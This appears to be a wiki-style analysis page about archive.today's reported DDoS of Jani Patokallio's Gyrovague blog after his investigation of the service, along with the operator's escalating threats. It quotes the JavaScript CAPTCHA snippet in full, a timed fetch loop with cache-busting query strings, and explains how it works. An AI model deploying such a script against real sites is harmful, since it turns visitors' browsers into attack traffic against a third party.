# Archive.today DDoSed a Critic's Blog

Jani Patokallio's OSINT investigation into archive.today sat quietly for 2.5 years — then the FBI subpoenaed the service's registrar, and the anonymous operator retaliated by embedding a DDoS script in the CAPTCHA page that turned every visitor into an unwitting bot attacking Patokallio's personal blog. A case study in the Streisand effect, the dark side of digital preservation, and how a widely-used infrastructure service allegedly responded to scrutiny with escalating personal threats.

---

## The Attack

> "archive.today is embedding JavaScript in their CAPTCHA that fires off ~3 requests/second to my blog from every browser that has the page open."

The mechanism is dead simple. This snippet was found on line 136 of archive.today's CAPTCHA HTML:

```javascript
setInterval(function() {
    fetch("https://gyrovague.com/?s=" + Math.random().toString(36).substring(2, 3 + Math.random() * 8), {
        referrerPolicy: "no-referrer",
        mode: "no-cors"
    });
}, 300);
```

Every visitor solving a CAPTCHA becomes an unwitting DDoS node. Random query strings defeat caching. `no-cors` mode means the target server can't distinguish these from normal traffic. uBlock Origin users were shielded, which is why the attack went unnoticed by most for weeks.

**The economics that saved the author:** a flat-fee hosting plan. The DDoS cost him "exactly zero dollars." If he'd been on metered cloud hosting, the story would be about a financially ruinous bill, not an annoyance.

## The Escalation

> Threatening to use the author's "noble and rare name" for "the name of a scam project or become a byword for a new category of AI porn"

The response followed a predictable arc: polite takedown request (went to Gmail spam) → GDPR complaint to WordPress.com (Automattic sided with the author) → DDoS script deployed → increasingly unhinged personal threats from someone calling themselves "Nora," including threats to investigate the author's grandfather and "vibecode a gyrovague.gay dating app."

Patokallio later concluded "Nora's" identity was likely appropriated from an unrelated person whose only connection was a prior takedown request. The real operator remains unknown.

## The Irony

> "archive.today is notorious for refusing to remove information no matter what."

Commenter "Noticer" captured the central contradiction: a service whose entire value proposition is "we never delete anything" was obsessively trying to erase breadcrumbs about its own operator. The 2023 investigation that triggered all this? ~10,000 views and some HN discussion — about as obscure as an internet post gets before someone starts DDoSing over it.

Had the operator done nothing, the investigation would have continued its quiet irrelevance. Instead, Patokallio wrote a sequel that gathered far more attention. The Streisand effect is not a metaphor.

---

## Key Themes

**#concept Streisand effect as operational law** — The attempt to suppress information is what amplifies it. This isn't a theoretical dynamic; it's a reliable causal mechanism. The 2023 post was dormant. The takedown efforts made it news again.

**#pattern DDoS via client-side JS injection** — Not a novel attack vector, but notable for being deployed by a widely-used infrastructure service against a single critic. The asymmetry is stark: one line of JS on a high-traffic page, zero cost to the attacker.

**#tool archive.today** — A digital preservation service used by journalists and researchers worldwide to create permanent snapshots of web pages. Also: a single point of failure operated anonymously, with no accountability mechanism, embedding attack code in its security check page.

**#person Jani Patokallio (jpatokal)** — Blogger at Gyrovague, Wikivoyage founder, OSINT hobbyist. His 2023 investigation into archive.today's operator was "boringly straightforward" curiosity-driven research — the same impulse that led him to reverse-engineer Clash of Clans monetization and Japanese subway construction.

---

## Critical Analysis

**This is not a technical vulnerability story — it's an accountability story.** The DDoS mechanism is unremarkable JavaScript. What's remarkable is that a piece of internet infrastructure used by millions can be weaponized against a critic with no recourse. There is no support team to email. There is no terms-of-service violation to report. The operator *is* the support team, and they deployed the attack.

**The GDPR complaint was the tell.** Filing a legal process in your own name against a critic is a categorically different move than sending an anonymous email. It suggests the operator believed they had genuine legal standing — or was willing to surface an identity (real or appropriated) to create pressure. Either way, it escalated the conflict from "anonymous webmaster requests a favor" to "named party initiates legal process."

**"Just use archive.org instead" is the wrong takeaway.** The real lesson is about the fragility of single-operator infrastructure. Archive.today's value — creating permanent, unalterable snapshots — is directly tied to its opacity. A transparent organization would face legal pressure to remove content. The service works *because* nobody knows who runs it. That same opacity means there's no way to stop the operator from embedding attack code.

**The hosting cost detail matters more than it seems.** Flat-fee hosting turned what could have been an existential threat (cloud bill bankruptcy) into a blog post. This is an accidental argument for boring hosting — when your infrastructure costs are predictable, your attacker's leverage disappears.

---

*Sources: [[raw/archive-today-ddos-gyrovague]]*
*Last updated: 2026-05-15*
